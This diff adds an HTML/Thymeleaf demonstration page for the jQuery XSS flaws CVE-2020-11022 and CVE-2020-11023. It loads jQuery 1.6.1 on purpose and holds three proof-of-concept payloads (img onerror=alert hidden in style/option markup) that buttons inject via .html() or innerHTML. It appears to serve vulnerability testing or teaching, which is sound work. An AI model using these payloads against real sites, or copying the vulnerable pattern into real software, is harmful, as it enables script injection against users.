@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org">
+<head>
+  <meta charset="utf-8">
+  <title>jQuery XSS Examples (CVE-2020-11022/CVE-2020-11023)</title>
+  <!-- 测试JQuery -->
+  <script src="/lib/jquery-1.6.1.js"></script>
+  <!-- <script src="./jquery.min.js"></script> -->
+</head>
+<body>
+<script>
+  function test(n,jq){
+    sanitizedHTML = document.getElementById('poc'+n).innerHTML;
+    if(jq){
+      $('#div').html(sanitizedHTML);
+    }else{
+      div.innerHTML=sanitizedHTML;
+    }
+  }
+</script>
+<h1>jQuery XSS Examples (CVE-2020-11022/CVE-2020-11023)</h1>
+<p style="color: red">* 这里JQuery版本为1.6.1 所以生效的POC为poc1和poc3 感兴趣的朋友可以自行修改导入版本为3.x 测试poc2</p>
+<h2>PoC 1</h2>
+<button onclick="test(1)">Assign to innerHTML</button> <button onclick="test(1,true)">Append via .html()</button>
+<xmp id="poc1">
+  <style><style /><img src=x onerror=alert(2)>
+  </xmp>
+
+  <h2>PoC 2 (Only jQuery 3.x affected)</h2>
+  <button onclick="test(2)">Assign to innerHTML</button> <button onclick="test(2,true)">Append via .html()</button>
+  <xmp id="poc2">
+  <img alt="<x" title="/><img src=x onerror=alert("1st")>">
+  </xmp>
+
+  <h2>PoC 3</h2>
+  <button onclick="test(3)">Assign to innerHTML</button> <button onclick="test(3,true)">Append via .html()</button>
+  <xmp id="poc3">
+  <option><style></option></select><img src=x onerror=alert("1st")></style>
+</xmp>
+
+<div id="div"></div>
+</body>
+</html>
